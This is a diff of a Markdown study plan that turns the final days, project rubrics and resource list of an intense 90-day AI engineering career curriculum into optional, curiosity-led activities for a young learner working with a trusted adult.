-- [ ] **Drill:** time yourself giving 2-minute crisp answers with zero hand-waving or corporate fluff
-- [ ] **Done when:** You can answer all 25 senior questions cold with mechanical precision, citing exact trade-offs, numbers, and physical realities.
+### Day 83 — Choose a question you still want to explore
+- [ ] Look back through your experiment notes
+- [ ] Choose one result that surprised you and try to explain why
+- [ ] Draw or describe what you might test next
+- [ ] **Try:** explain one idea to a curious friend or trusted adult
+- [ ] **Done when:** You can choose one question about your project and explain what you know, what you are unsure about, and how you might find out.
 
-### Day 84 — Ship #3 (Capstone): Production AI Platform Launch & Verification
-- [ ] Launch your public Capstone repository with live demo links, architecture diagrams, and the Production Failure Playbook
-- [ ] Execute full load tests: verify 50 concurrent streaming sessions with zero connection drops
-- [ ] Tag the Capstone release v1.0.0 with verified cryptographic SHA-256 manifests
-- [ ] Celebrate completing the core 12-week platform build! You now enter the Days 85–90 Capstone Hardening & Hiring Sprint
-- [ ] **Done when:** Your Capstone production system is deployed, load-tested, and live on the internet.
+### Day 84 — Show what you made: a project you can explain
+- [ ] Choose one small part of your project you would like to show
+- [ ] Try it with a few pretend examples and note what happens
+- [ ] Draw a simple picture showing how a question becomes an answer
+- [ ] Celebrate the project, including the parts you are still figuring out
+- [ ] **Done when:** You can demonstrate your project privately or share it with a trusted adult, and explain one thing you are proud of and one thing you would improve.
 
 ---
 
-## Week 13 — Capstone Hardening & Hiring Sprint
+## Week 13 — Optional Challenges: What Else Can Your Project Do?
 *Days 85–90*
 
-**Outcome: "Six days of battle-hardening: chaos engineering, tail latency profiling, SLO fencing, whiteboard defense, and production portfolio launch."**
+**Outcome: "I can choose a challenge that interests me, test a project under new conditions, and decide what I want to explore next."**
 
-### Day 85 — Chaos engineering: fault injection, 503 circuit breakers, and degraded mode fallbacks
-- [ ] Simulate upstream model provider 503 outage and rate-limit storms with an adversarial HTTP proxy
-- [ ] Implement circuit breaking in your client: trip after 5 consecutive failures and route to a fallback local/cheaper model
-- [ ] Build graceful degradation: return cached or condensed answers when latency budget exceeds 3,000ms
-- [ ] **Build:** write automated chaos test verifying zero unhandled 500 errors during a 60-second simulated upstream outage
-- [ ] **Done when:** Your system gracefully degrades to cached/fallback models under simulated provider outages without dropping user requests.
+### Day 85 — Optional: what should happen if a helper is unavailable?
+- [ ] Optional: imagine what your project should do if its helper is unavailable
+- [ ] Add a friendly message explaining that it cannot answer right now
+- [ ] Try a simple pretend failure in a local example
+- [ ] **Try:** draw what the learner should see when something goes wrong
+- [ ] **Done when:** You have a friendly message for when your project cannot answer.
 
-### Day 86 — Cold-start benchmarking and latency tail trimming: profiling TTFT and p99 waterfalls
-- [ ] Profile the latency waterfall of your RAG pipeline: chunk retrieval, embedding call, reranker, and TTFT
-- [ ] Identify and fix p99 latency spikes: socket connection pooling, pre-warming TCP/TLS connections, and chunk pre-fetching
-- [ ] Benchmark TTFT under concurrent loads (1, 10, 50 workers) and graph latency distribution percentiles
-- [ ] **Build:** latency profiling harness that logs exact millisecond breakdowns for every pipeline stage to OpenTelemetry
-- [ ] **Done when:** p99 TTFT is documented and optimized, with every millisecond accounted for in an OpenTelemetry waterfall trace.
+### Day 86 — Optional: compare how long two versions take
+- [ ] Optional: compare how long two pretend versions of your program take
+- [ ] Guess which step takes the longest, then measure it
+- [ ] Try one small change and compare again
+- [ ] **Try:** draw a simple before-and-after chart
+- [ ] **Done when:** You can describe what changed and whether your guess about speed was right.
 
-### Day 87 — Production runbooks, SLO fencing, and the 2:00 AM incident response playbook
-- [ ] Define concrete Service Level Objectives (SLOs): 99.5% availability, p95 TTFT < 1.2s, budget spend limit $50/day
-- [ ] Write the 2:00 AM incident runbook: clear triage steps for token budget exhaustion, latency spikes, and poison prompt attacks
-- [ ] Configure automated alerts and emergency kill-switches to halt agent loops before runaway costs occur
-- [ ] **Build:** commit `RUNBOOK.md` with step-by-step diagnostic commands, rollback scripts, and emergency switches
-- [ ] **Done when:** You have an actionable RUNBOOK.md that any on-call engineer can follow at 2:00 AM to diagnose and mitigate production outages.
+### Day 87 — Add a friendly help note for your project
+- [ ] Imagine three ways your project might get confused
+- [ ] Write a calm note describing what to try if one happens
+- [ ] Make sure the project cannot spend money or change real information by itself
+- [ ] **Try:** add a friendly help or reset instruction
+- [ ] **Done when:** Someone you trust can follow your guide to try the project and reset it safely.
 
-### Day 88 — System architecture whiteboard defense: trade-offs, cost models, and failure modes
-- [ ] Draw the complete physical architecture diagram of your Capstone: ingress, auth, queues, vector DB, model router, and observability
-- [ ] Prepare crisp 2-minute spoken defenses for every key trade-off: Why Pinecone vs pgvector? Why hybrid RRF over dense-only? Why vLLM vs Ollama?
-- [ ] Conduct a mock whiteboard interview with a peer or record yourself defending your architecture under aggressive questioning
-- [ ] **Defense:** explain exactly how your system handles a 10x traffic spike and how unit costs scale with token volume
-- [ ] **Done when:** You can defend every architectural component, trade-off, and failure recovery mechanism on a whiteboard with zero hesitation.
+### Day 88 — Draw how your project works
+- [ ] Draw the path from a question to the answer your project gives
+- [ ] Label any notes, search, or model steps that are involved
+- [ ] Circle one place where the project could make a mistake
+- [ ] **Try:** explain the drawing in your own words
+- [ ] **Done when:** You can explain the main steps in your project and point to one place that needs careful checking.
 
-### Day 89 — Live technical coding and take-home challenge polish under time pressure
-- [ ] Simulate a 60-minute live coding challenge: build a streaming SSE client with token cancellation from memory
-- [ ] Simulate a second 60-minute challenge: write a custom hybrid search RRF reranker with pure Python without consulting external docs
-- [ ] Review your code structure, docstrings, type annotations, and unit test coverage to ensure senior readability
-- [ ] **Drill:** complete both live challenges cleanly within the 60-minute timebox with zero unhandled exceptions
-- [ ] **Done when:** You can implement streaming clients, token buckets, and RRF rerankers in pure Python under a 60-minute live coding clock.
+### Day 89 — Optional: improve one small thing
+- [ ] Optional: choose one part of your project to make a little clearer or more useful
+- [ ] Try a new made-up example and see what happens
+- [ ] Ask someone you trust what they find confusing
+- [ ] **Try:** improve one small thing, or decide it is good enough for now
+- [ ] **Done when:** You tried one new idea and can say what you learned, even if you decide not to keep the change.
 
-### Day 90 — Production Launch, Portfolio Showcase & The 90-Day Transformation Complete
-- [ ] Publish your public portfolio repository with live demo links, architecture diagrams, and the Production Failure Playbook
-- [ ] Publish your technical deep-dive engineering article documenting architecture, cost models, and lessons learned
-- [ ] Send personalized, value-first outreach to 5 targeted engineering hiring managers with direct links to your shipped work
-- [ ] Celebrate! You have conquered the complete 90-day transformation from zero to a battle-tested, employable production AI Engineer
-- [ ] **Done when:** Your 3 production systems are live, public, and mathematically proven. You have completed the 90-day journey and are ready for senior engineering roles!
+### Day 90 — Celebrate, reflect & choose your next question
+- [ ] Show your project privately to someone you trust, or keep it for yourself
+- [ ] Explain one thing you learned and one question you still have
+- [ ] Choose one question you want to explore next, then draw or write down how you might investigate it
+- [ ] Celebrate what you made, what surprised you, and what you want to discover next
+- [ ] **Done when:** You have followed your curiosity, built something you understand, and chosen a next question to explore. The optional challenges can be skipped or revisited any time.
 
 <!-- END GENERATED DAYS -->
 
 ---
 
-## 4. The 25 Senior AI Engineering Questions You Must Answer Cold
+## 4. Optional Curious Extras: Questions to Explore
+
+These are questions for an adult practitioner or a learner who has already mastered the main path and wants a serious technical stretch. They are deliberately advanced, may involve paid or online systems, and are not assignments or a measure of ability. A gifted learner should get more room to investigate—not be expected to perform a professional engineering job.
 
 1. **RAG vs. Fine-Tuning vs. Long-Context Prompt Caching:** How do you choose between them for a dynamic enterprise dataset of 500,000 pages? Break down the physical cost, latency, and knowledge update velocity trade-offs.
 2. **BPE Tokenization Mechanics:** Why does a frontier model stumble when asked to count the letter 'r' in "strawberry" or reverse a 10-digit number? Explain the physical mechanism of Byte-Pair Encoding merges.
@@ -839,55 +845,49 @@ Month 3: Armor, High-Throughput Silicon & Mission Control (Weeks 9–13)
 
 ---
 
-## 5. The Milestone Portfolio Bar (3 Production Systems with Tiered Rubrics)
+## 5. A Project Is for Learning, Not Proving Your Worth
 
-To get hired as a high-earning AI engineer, certificates are completely worthless. Hiring managers are flooded with candidates who copied a toy script from a YouTube tutorial. You need running, public, observable systems that prove you understand the physical machine.
+You do not need to publish your work, impress a hiring manager, or build production software. A small project you understand is a real achievement. Keep it private unless a trusted adult agrees it is safe to share.
 
-Use the **Tiered Mastery Rubric** to evaluate your systems:
-- **Bronze (Junior Baseline):** Works cleanly on the happy path; typed Python, Pydantic schemas, and readable documentation.
-- **Silver (Production-Ready):** Resilient under adverse conditions; handles 429 backoff with jitter, validates boundary schemas, logs TTFT latency, and passes automated unit/integration test suites.
-- **Gold (Senior Signal):** Hardened against security attacks; full distributed tracing (Langfuse), CI regression gates with quantitative thresholds, automated failover, and a deep-dive architectural trade-off write-up with real numbers.
-
----
-
-### Project 1 (End of Month 1): Structured Extraction & Streaming Microservice
-*A high-throughput asynchronous API service extracting typed data from chaotic, unstructured text with real-time SSE streaming.*
-
-| Tier | Requirements |
-|---|---|
-| **Bronze** | FastAPI endpoint accepting raw text and returning a valid Pydantic JSON schema on happy-path inputs; automated OpenAPI docs at `/docs`; clean README. |
-| **Silver** | Server-Sent Events (SSE) token streaming with sub-400ms TTFT logging; automated 2-turn self-repair loops recovering from malformed JSON; handles 429 backoff with jitter; 95%+ first-pass extraction accuracy on `datasets/messy_invoices.json`. |
-| **Gold** | Dockerized multi-stage container (<150MB) deployed live on cloud metal; BudgetGuard $2 hard session spend ceiling; comprehensive `pytest` suite with mocked provider responses; README featuring p50/p95 latency tables and cost-per-request calculations to $0.0001 precision. |
+Use these as optional project ideas, not grades:
+- **Try:** Make a small helper for a topic you care about.
+- **Explore:** Add a searchable set of made-up notes and test it with a few questions.
+- **Explain:** Show what it can do, where it gets confused, and what you learned.
 
 ---
 
-### Project 2 (End of Month 2): Enterprise Knowledge Assistant with CI Evals & MCP
-*A domain-specific RAG platform with hybrid search (BM25 + dense), cross-encoder reranking, verifiable source citations, MCP server integration, and CI regression gates.*
+### Project 1: A small helper that shapes an answer
+*Try asking for a made-up creature card or story character with a few fields.*
 
-| Tier | Requirements |
-|---|---|
-| **Bronze** | Vector search using pgvector or Qdrant with structural document chunking and LLM response generation over retrieved chunks. |
-| **Silver** | Dual-radar hybrid search combining BM25 and dense embeddings via Reciprocal Rank Fusion (RRF, $k=60$); cross-encoder reranking stage; clickable inline source citations linking claims to chunk IDs; multi-tenant metadata pre-filtering. |
-| **Gold** | Standard Model Context Protocol (MCP) server running over stdio/SSE exposing tools and document resources to desktop agents; automated evaluation harness (`python3 eval.py`) proving Recall@5 > 90% and MRR > 0.80 on a 40-question golden set; GitHub Actions CI workflow failing PRs on >1.5% recall regression; README opening with a quantitative before-and-after evaluation scorecard. |
+| Try | Make a pretend answer with a few parts, then check whether any part is missing. |
+| Explore | Compare two instructions and see how the answer changes. |
+| Explain | Describe one thing the model gets wrong and how you checked it. |
 
 ---
 
-### Project 3 (End of Month 3 - Capstone): Multi-Tenant Production AI Platform
-*An end-to-end production AI system incorporating compound AI workflows, distributed observability, open model failover cascades, indirect injection defense, and an emergency outage playbook.*
+### Project 2: A searchable pretend library
+*Use a small set of notes, ask questions, and check whether the answer points to a useful clue.*
 
-| Tier | Requirements |
-|---|---|
-| **Bronze** | Full-stack application (Streamlit or Next.js UI + FastAPI backend); multi-step task execution with tools; deployed live on public infrastructure. |
-| **Silver** | Compound AI architecture (Router + Evaluator-Optimizer state machine); Langfuse distributed tracing capturing every token, span, and dollar; XML boundary fences and AST sandboxes neutralizing indirect prompt injection; cryptographic human-in-the-loop approval gates for destructive actions. |
-| **Gold** | Sustained load testing with Locust/k6 proving 99%+ success rate and p95 latency < 2.5s under 20 concurrent users; automatic failover to local vLLM/Ollama open model during provider blackouts; comprehensive **Production Failure Playbook (`PLAYBOOK.md`)** detailing step-by-step triage for 5 outage scenarios; published **Deep-Dive Architectural Write-up** analyzing engineering trade-offs, token economics, and empirical evaluation progressions. |
+| Try | Make five pretend notes and search for a word in them. |
+| Explore | Ask a question in two ways and compare which note each search finds. |
+| Explain | Show which note supports an answer, and identify when the notes do not contain enough information. |
+
+---
+
+### Project 3: A project of your own
+*Combine ideas you understand into a small project you can test, explain, and keep private.*
+
+| Try | Choose a question you care about and build a small helper for it. |
+| Explore | Add one safe tool or a searchable set of pretend notes. |
+| Explain | Draw how it works, try examples, and name one limitation. Keep it private unless an adult reviews sharing. |
 
 ---
 
 ## 6. Curated High-Signal Resource List (One per Category)
 
-- **Book:** *AI Engineering* — Chip Huyen (O'Reilly). The definitive comprehensive guide for the role.
-- **Evals & Error Analysis:** Hamel Husain (`hamel.dev`). Master his evaluation and error-labeling methodologies.
-- **Field Awareness:** Simon Willison (`simonwillison.net`). Essential weekly insights on prompt injection, open models, and tooling.
+- **Book (adult extension):** *AI Engineering* — Chip Huyen (O'Reilly). Written for professional practitioners; ask an adult to help choose chapters.
+- **Evals & Error Analysis (adult extension):** Hamel Husain (`hamel.dev`). Pick a specific question and explore it with adult guidance.
+- **Field Awareness (adult extension):** Simon Willison (`simonwillison.net`). Some material is technical; browse with a trusted adult.
 - **Retrieval Quality:** Ragas Documentation (`docs.ragas.io`) and Cohere Rerank guides.
 - **Protocols & Standards:** Model Context Protocol Specification (`modelcontextprotocol.io`).
 - **Tracing & Telemetry:** Langfuse Documentation (`langfuse.com/docs`).
